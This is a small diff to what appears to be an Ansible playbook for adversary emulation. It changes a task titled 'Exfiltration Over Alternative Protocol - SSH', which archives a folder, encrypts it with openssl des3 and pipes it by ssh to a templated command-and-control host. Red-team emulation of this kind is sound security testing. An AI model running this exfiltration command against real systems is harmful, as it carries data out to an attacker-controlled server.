@@ -10,5 +10,5 @@
       register: exfil_check
     - name: Exfiltration Over Alternative Protocol - SSH
       shell: |
-        tar czpf - {{ exfiltration_folder }}/* | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}.enc'
+        tar czpf - {{ exfiltration_folder }}/* | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}.tar.gz.enc'
       when: exfil_check.stat.exists
